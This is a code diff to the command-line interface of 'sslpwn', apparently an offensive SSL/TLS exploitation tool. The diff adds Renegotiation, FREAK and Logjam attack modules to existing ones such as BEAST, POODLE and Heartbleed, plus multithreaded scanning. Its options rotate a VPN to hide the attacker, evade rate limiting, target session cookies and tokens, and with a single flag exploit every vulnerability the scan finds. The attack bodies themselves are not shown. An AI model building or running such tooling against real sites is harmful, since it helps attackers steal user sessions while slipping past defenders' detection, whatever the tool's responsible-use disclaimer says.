@@ -1,6 +1,8 @@
-"""Command‑line interface for sslpwn; scan and exploit mode."""
+"""Command‑line interface for sslpwn; scan and exploit mode with multi‑threading."""
+
 import argparse
 import sys
+import concurrent.futures
 from typing import Optional, List, Dict, Any
 
 from sslpwn import __version__
@@ -15,18 +17,20 @@ from sslpwn.report_writer import ReportWriter
 from sslpwn.attacks import (
     BeastAttack, Lucky13Attack, BreachAttack, PoodleAttack,
     CrimeAttack, HeartbleedAttack, TicketbleedAttack, RobotAttack,
+    RenegotiationAttack, FreakAttack, LogjamAttack,
 )
 
 
 def main() -> None:
     parser = argparse.ArgumentParser(
-        description="Test for SSL/TLS vulnerabilities; scan all or exploit a single module.",
+        description="Test for SSL/TLS vulnerabilities. Scan all or exploit a single module with adaptive evasion.",
         epilog="Use responsibly and only on systems you own or are authorised to test.",
     )
     parser.add_argument("target", help="Target HTTPS URL, e.g. https://example.com")
     parser.add_argument("--scan", action="store_true",
                         help="Scan for all vulnerabilities, report findings, then optionally exploit.")
-    parser.add_argument("--module", choices=["beast", "lucky13", "breach", "poodle", "crime", "heartbleed", "ticketbleed", "robot"],
+    parser.add_argument("--module", choices=["beast", "lucky13", "breach", "poodle", "crime", "heartbleed",
+                                             "ticketbleed", "robot", "renegotiation", "freak", "logjam"],
                         help="Exploit a single module (ignored if --scan is set).")
     parser.add_argument("--cookie-name", help="Cookie name to decrypt (required for cookie‑based modules).")
     parser.add_argument("--cookie-value", help="Known test cookie value for verification (required for cookie‑based modules).")
@@ -36,10 +40,11 @@ def main() -> None:
     parser.add_argument("--rate", type=float, default=2.0, help="Requests per second (default 2.0).")
     parser.add_argument("--output-dir", default=".", help="Directory for output files.")
     parser.add_argument("--no-vpn", action="store_true", help="Disable Mullvad VPN rotation.")
-    parser.add_argument("--adaptive", action="store_true", help="Enable adaptive rate‑limiting evasion.")
+    parser.add_argument("--adaptive", action="store_true", help="Enable adaptive rate‑limiting evasion with TLS cert generation.")
     parser.add_argument("--adaptive-threshold", type=int, default=3, help="Consecutive errors before evasion.")
     parser.add_argument("--adaptive-backoff-base", type=float, default=1.0, help="Initial backoff time.")
     parser.add_argument("--adaptive-max-backoff", type=float, default=60.0, help="Maximum backoff time.")
+    parser.add_argument("--threads", type=int, default=4, help="Number of threads for concurrent scanning (default 4).")
     parser.add_argument("--yes", "-y", action="store_true",
                         help="Automatically answer yes to all prompts (exploit all found vulnerabilities).")
     parser.add_argument("--version", action="version", version=f"sslpwn {__version__}")
@@ -80,23 +85,26 @@ def main() -> None:
             error_threshold=args.adaptive_threshold,
         )
 
-    # scan mode; check all vulnerabilities
+    # scan mode; use thread pool for concurrent checks
     if args.scan:
         scan_and_handle(target, output, vpn, ua, limiter, adaptive, args)
     else:
-        # single exploit mode
         if not args.module:
             console.print("[bold red]Either --scan or --module must be specified.[/bold red]")
             sys.exit(1)
         run_single_exploit(args, target, output, vpn, ua, limiter, adaptive)
 
+    # clean up adaptive manager
+    if adaptive:
+        adaptive.cleanup()
     output.finalise()
 
 
 def scan_and_handle(target, output, vpn, ua, limiter, adaptive, args):
-    """Run all vulnerability checks, report, and prompt for exploitation."""
+    """Run all vulnerability checks concurrently, report, and prompt for exploitation."""
     output.log(f"Starting vulnerability scan on {target}", "INFO")
 
+    # Instantiate attacks with dummy params; checks don't need them.
     modules = {
         "BEAST": BeastAttack(target, output, vpn, ua, limiter, "", "", adaptive),
         "Lucky13": Lucky13Attack(target, output, vpn, ua, limiter, "", "", adaptive),
@@ -106,27 +114,42 @@ def scan_and_handle(target, output, vpn, ua, limiter, adaptive, args):
         "Heartbleed": HeartbleedAttack(target, output, vpn, ua, limiter, "", "", adaptive),
         "Ticketbleed": TicketbleedAttack(target, output, vpn, ua, limiter, "", "", adaptive),
         "ROBOT": RobotAttack(target, output, vpn, ua, limiter, "", "", adaptive),
+        "Renegotiation": RenegotiationAttack(target, output, vpn, ua, limiter, "", "", adaptive),
+        "FREAK": FreakAttack(target, output, vpn, ua, limiter, "", "", adaptive),
+        "Logjam": LogjamAttack(target, output, vpn, ua, limiter, "", "", adaptive),
     }
 
     findings = []
     vulnerable_modules = []
 
-    for name, attack in modules.items():
-        console.print(f"\n[bold]Checking {name}...[/bold]")
+    def check_one(name, attack):
+        console.print(f"Checking {name}...", style="bold")
         output.log(f"Checking {name}...", "INFO")
         try:
             is_vuln = attack.check_vulnerability()
             status = "VULNERABLE" if is_vuln else "NOT VULNERABLE"
             console.print(f"  {name}: {status}")
-            findings.append({"name": name, "vulnerable": is_vuln})
-            if is_vuln:
-                vulnerable_modules.append(name)
+            return (name, is_vuln, None)
         except Exception as e:
-            console.print(f"  {name}: ERROR - {e}")
+            console.print(f"  {name}: ERROR - {e}", style="red")
             output.log(f"Check {name} failed: {e}", "ERROR")
-            findings.append({"name": name, "vulnerable": False, "error": str(e)})
+            return (name, False, str(e))
 
-    # Write initial report (scan results)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
+        future_to_name = {executor.submit(check_one, n, a): n for n, a in modules.items()}
+        for future in concurrent.futures.as_completed(future_to_name):
+            name = future_to_name[future]
+            try:
+                n, vuln, err = future.result()
+            except Exception as exc:
+                console.print(f"  {name}: EXCEPTION - {exc}", style="red")
+                findings.append({"name": name, "vulnerable": False, "error": str(exc)})
+                continue
+            findings.append({"name": n, "vulnerable": vuln, "error": err or ""})
+            if vuln:
+                vulnerable_modules.append(n)
+
+    # Write initial report
     report_writer = ReportWriter(safe_filename(target.split("://")[1].split("/")[0]), "reports")
     report_writer.write_reports(findings)
     output.log(f"Scan reports saved in reports/{safe_filename(target.split('://')[1].split('/')[0])}/", "INFO")
@@ -149,7 +172,7 @@ def scan_and_handle(target, output, vpn, ua, limiter, adaptive, args):
 
     # Gather required credentials if not provided
     if not args.cookie_name or not args.cookie_value:
-        if any(m in vulnerable_modules for m in ("BEAST", "Lucky13", "POODLE", "Heartbleed", "Ticketbleed", "ROBOT")):
+        if any(m in vulnerable_modules for m in ("BEAST", "Lucky13", "POODLE", "Heartbleed", "Ticketbleed", "ROBOT", "Renegotiation")):
             console.print("[yellow]Cookie‑based modules require --cookie‑name and --cookie‑value.[/yellow]")
             args.cookie_name = console.input("Cookie name: ").strip()
             args.cookie_value = console.input("Cookie value: ").strip()
@@ -157,7 +180,7 @@ def scan_and_handle(target, output, vpn, ua, limiter, adaptive, args):
         console.print("[yellow]BREACH/CRIME require --token‑parameter.[/yellow]")
         args.token_parameter = console.input("Token parameter: ").strip()
 
-    # Run exploits for each vulnerable module (with user interaction)
+    # Run exploits sequentially (exploits are long and may overlap in network, but adaptive handles evasion)
     for name in vulnerable_modules:
         console.print(f"\n[bold]Exploiting {name}...[/bold]")
         output.log(f"Starting exploit for {name}", "INFO")
@@ -188,6 +211,15 @@ def scan_and_handle(target, output, vpn, ua, limiter, adaptive, args):
             elif name == "ROBOT":
                 attack = RobotAttack(target, output, vpn, ua, limiter,
                                      args.cookie_name, args.cookie_value, adaptive)
+            elif name == "Renegotiation":
+                attack = RenegotiationAttack(target, output, vpn, ua, limiter,
+                                             args.cookie_name, args.cookie_value, adaptive)
+            elif name == "FREAK":
+                attack = FreakAttack(target, output, vpn, ua, limiter,
+                                     args.cookie_name, args.cookie_value, adaptive)
+            elif name == "Logjam":
+                attack = LogjamAttack(target, output, vpn, ua, limiter,
+                                      args.cookie_name, args.cookie_value, adaptive)
             else:
                 continue
 
@@ -217,7 +249,7 @@ def scan_and_handle(target, output, vpn, ua, limiter, adaptive, args):
 def run_single_exploit(args, target, output, vpn, ua, limiter, adaptive):
     """Run the specified module's exploit directly."""
     # Ensure required parameters are present
-    if args.module in ("beast", "lucky13", "poodle", "heartbleed", "ticketbleed", "robot"):
+    if args.module in ("beast", "lucky13", "poodle", "heartbleed", "ticketbleed", "robot", "renegotiation"):
         if not args.cookie_name or not args.cookie_value:
             console.print("[bold red]This module requires --cookie-name and --cookie-value.[/bold red]")
             sys.exit(1)
@@ -227,29 +259,27 @@ def run_single_exploit(args, target, output, vpn, ua, limiter, adaptive):
             sys.exit(1)
 
     if args.module == "beast":
-        attack = BeastAttack(target, output, vpn, ua, limiter,
-                             args.cookie_name, args.cookie_value, adaptive)
+        attack = BeastAttack(target, output, vpn, ua, limiter, args.cookie_name, args.cookie_value, adaptive)
     elif args.module == "lucky13":
-        attack = Lucky13Attack(target, output, vpn, ua, limiter,
-                               args.cookie_name, args.cookie_value, adaptive)
+        attack = Lucky13Attack(target, output, vpn, ua, limiter, args.cookie_name, args.cookie_value, adaptive)
     elif args.module == "breach":
-        attack = BreachAttack(target, output, vpn, ua, limiter,
-                              args.token_parameter, args.mask_length, adaptive)
+        attack = BreachAttack(target, output, vpn, ua, limiter, args.token_parameter, args.mask_length, adaptive)
     elif args.module == "poodle":
-        attack = PoodleAttack(target, output, vpn, ua, limiter,
-                              args.cookie_name, args.cookie_value, adaptive)
+        attack = PoodleAttack(target, output, vpn, ua, limiter, args.cookie_name, args.cookie_value, adaptive)
     elif args.module == "crime":
-        attack = CrimeAttack(target, output, vpn, ua, limiter,
-                             args.token_parameter, args.mask_length, adaptive)
+        attack = CrimeAttack(target, output, vpn, ua, limiter, args.token_parameter, args.mask_length, adaptive)
     elif args.module == "heartbleed":
-        attack = HeartbleedAttack(target, output, vpn, ua, limiter,
-                                  args.cookie_name, args.cookie_value, adaptive)
+        attack = HeartbleedAttack(target, output, vpn, ua, limiter, args.cookie_name, args.cookie_value, adaptive)
     elif args.module == "ticketbleed":
-        attack = TicketbleedAttack(target, output, vpn, ua, limiter,
-                                   args.cookie_name, args.cookie_value, adaptive)
+        attack = TicketbleedAttack(target, output, vpn, ua, limiter, args.cookie_name, args.cookie_value, adaptive)
     elif args.module == "robot":
-        attack = RobotAttack(target, output, vpn, ua, limiter,
-                             args.cookie_name, args.cookie_value, adaptive)
+        attack = RobotAttack(target, output, vpn, ua, limiter, args.cookie_name, args.cookie_value, adaptive)
+    elif args.module == "renegotiation":
+        attack = RenegotiationAttack(target, output, vpn, ua, limiter, args.cookie_name, args.cookie_value, adaptive)
+    elif args.module == "freak":
+        attack = FreakAttack(target, output, vpn, ua, limiter, args.cookie_name, args.cookie_value, adaptive)
+    elif args.module == "logjam":
+        attack = LogjamAttack(target, output, vpn, ua, limiter, args.cookie_name, args.cookie_value, adaptive)
     else:
         console.print("[bold red]Unknown module[/bold red]")
         sys.exit(1)
